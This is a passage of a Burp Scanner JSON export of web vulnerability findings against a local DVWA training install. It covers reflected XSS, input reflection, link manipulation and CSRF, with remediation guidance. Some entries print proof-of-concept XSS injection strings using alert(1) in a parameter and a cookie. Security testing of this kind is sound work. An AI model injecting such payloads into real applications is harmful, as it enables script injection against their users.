        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "23": {
        "\ufeffissue__serialNumber": "3.26275E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [id parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>id</b> request parameter is copied into the value of an HTML tag attribute which is an event handler and is encapsulated in double quotation marks. The payload <b>85748';alert(1)//482</b> was submitted in the id parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Note that the input is echoed into an existing event handler within the response. JavaScript injected into this context will only execute when the relevant event occurs. This may require some action by the victim user, and may hinder exploitation. It may be possible to manually fine tune an attack to increase the likelihood that the event occurs.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "Echoing user-controllable data within an event handler is inherently dangerous and can make XSS attacks difficult to prevent. The defense of HTML-encoding user-controllable data is not effective in this context, because browsers will HTML-decode the event handler string before executing it as script.  If at all possible, the application should avoid echoing user data within this context. ",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "24": {
        "\ufeffissue__serialNumber": "4.59674E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/view_source.php",
        "issue__location": "/dvwa/vulnerabilities/view_source.php [id parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>id</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "25": {
        "\ufeffissue__serialNumber": "3.72742E+18",
        "issue__type": "5246979",
        "issue__name": "Link manipulation (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/security.php",
        "issue__location": "/dvwa/security.php [name of an arbitrarily supplied URL parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Link manipulation occurs when an application embeds user input into the path or domain of URLs that appear within application responses.&nbsp;An attacker can use this vulnerability to construct a link that, if visited by another application user, will modify the target of URLs within the response. It may be possible to leverage this to perform various attacks, such as:</p>\\n<ul>\\n  <li>Manipulating the path of an on-site link that has sensitive parameters in the URL. If the response from the modified path contains references to off-site resources, then the sensitive data might be leaked to external domains via the Referer header.</li>\\n  <li>Manipulating the URL targeted by a form action, making the form submission have unintended side effects.</li>\\n  <li>Manipulating the URL used by a CSS import statement to point to an attacker-uploaded file, resulting in CSS injection.</li>\\n  <li>Injecting on-site links containing XSS exploits, thereby bypassing browser anti-XSS defenses, since those defenses typically do not operate on on-site links.</li>\\n</ul>\\n<p>The security impact of this issue depends largely on the nature of the application functionality. Even if it has no direct impact on its own, an attacker may use it in conjunction with other vulnerabilities to escalate their overall severity.</p>",
        "issue__remediationBackground": "<p>Consider using a whitelist to restrict user input to safe values. Please note that in some situations this issue will have no security impact, meaning no remediation is necessary.</p>",
        "issue__references": "<ul>\\n  <li><a href=\"http://blog.mish.re/index.php/2017/04/29/yahoo-bug-bounty-chaining-3-minor-issues-to-takeover-flickr-accounts/\">Using path manipulation to hijack Flickr accounts</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n  <li><a href=\"https://cwe.mitre.org/data/definitions/73.html\">CWE-73: External Control of File Name or Path</a></li>\\n  <li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/153.html\">CAPEC-153: Input Data Manipulation</a></li>\\n</ul>",
        "issue__issueDetail": "The name of an arbitrarily supplied URL parameter is copied into the response within the path of a URL.<br><br> The payload <b>mc07rdyplr</b> was submitted in the name of an arbitrarily supplied URL parameter. This input was echoed unmodified within the response header <b>Location</b>.<br><br>This proof-of-concept attack demonstrates that it is possible to modify the URL to reference an arbitrary path. It is also possible to control the query string of the URL to perform HTTP client-side parameter pollution attacks.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "26": {
        "\ufeffissue__serialNumber": "3.95988E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/upload/",
        "issue__location": "/dvwa/vulnerabilities/upload/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>nubhp'&gt;&lt;script&gt;alert(1)&lt;/script&gt;ujla1</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "27": {
        "\ufeffissue__serialNumber": "4.0214E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/upload/",
        "issue__location": "/dvwa/vulnerabilities/upload/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "28": {
        "\ufeffissue__serialNumber": "8.97628E+18",
        "issue__type": "2098944",
        "issue__name": "Cross-site request forgery",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csrf/test_credentials.php",
        "issue__location": "/dvwa/vulnerabilities/csrf/test_credentials.php",
        "issue__severity": "Information",
        "issue__confidence": "Tentative",
        "issue__issueBackground": "<p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>\\n<ul>\\n<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>\\n<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>\\n<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul>",
        "issue__remediationBackground": "<p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>\\n<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p>",
        "issue__references": "<ul>\\n    <li><a href=\"https://portswigger.net/web-security/csrf\">Web Security Academy: Cross-site request forgery</a></li>\\n    <li><a href=\"https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-\">Using Burp to Test for Cross-Site Request Forgery</a></li>\\n    <li><a href=\"https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf\">The Deputies Are Still Confused</a></li>\\n</ul>",
